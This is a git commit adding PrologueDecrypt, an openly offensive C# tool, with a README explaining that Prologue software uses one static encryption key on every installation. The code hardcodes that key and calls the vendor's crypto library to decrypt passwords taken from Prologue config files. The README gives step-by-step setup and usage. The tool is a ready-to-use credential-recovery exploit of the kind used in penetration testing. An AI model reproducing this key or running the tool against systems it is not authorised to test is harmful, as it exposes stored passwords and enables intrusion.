3fd553315edbbd4029fe7ac54f44a9183f6cfe08
Micah Van Deusen <micahjvandeusen@gmail.com>
2020-12-16 16:38:03 -0600

    Initial Commit

---
+++ PrologueDecrypt/Program.cs
@@ -0,0 +1,31 @@
+﻿using IPSCrypto;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace PrologueDecrypt
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            if (args.Length <= 0 || args[0] == "help" || args[0] == "?")
+            {
+                help();
+            }
+            Console.WriteLine(((IEngine)new Engine()).decrypt("~{(#@&TORY<>?:[", args[0]));
+        }
+
+        private static void help()
+        {
+            Console.WriteLine();
+            Console.WriteLine("How to use Prologue Decrypt");
+            Console.WriteLine("======================");
+            Console.WriteLine(@"c:\> PrologueDecrypt.exe <encrypted string excluding the @ symbol>");
+            Console.WriteLine();
+
+        }
+    }
+}
---
+++ README.md
@@ -0,0 +1,18 @@
+# PrologueDecrypt
+ 
+Description
+============
+
+Prologue uses a static encryption key across all installations.
+ PrologueDecrypt is an offensive security C# tool designed to decrypt these passwords located in Prologue config files.
+
+Setup
+==============================
+
+1. Download PrologueDecrypt
+
+2. Register the required crypto COM library as an admin user `regsvr32 IPSCrypto.dll`
+
+3. Open up PrologueDecrypt.sln in Visual Studio (was tested using Visual Studio 2019) and build.
+
+4. Run PrologueDecrypt.exe passing the encrypted string without the @ symbol at the start of the string.
